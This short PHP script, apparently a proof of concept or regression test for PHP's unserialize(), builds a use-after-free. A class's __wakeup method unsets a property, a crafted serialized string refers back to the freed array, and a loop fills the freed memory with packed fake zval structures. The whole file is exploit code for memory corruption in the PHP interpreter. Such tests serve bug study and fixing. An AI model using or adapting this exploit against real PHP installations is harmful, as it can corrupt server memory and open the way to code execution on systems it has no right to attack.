<?php
class evilClass {
	public $name;
	function __wakeup() {
		unset($this->name);
	}
}

$fakezval = pack(
    'IIII',
    0x00100000,
    0x00000400,
    0x00000000,
    0x00000006 
);

$data = unserialize('a:2:{i:0;O:9:"evilClass":1:{s:4:"name";a:2:{i:0;i:1;i:1;i:2;}}i:1;R:4;}');

for($i = 0; $i < 5; $i++) {
    $v[$i] = $fakezval.$i;
}

var_dump($data);
?>
===DONE===
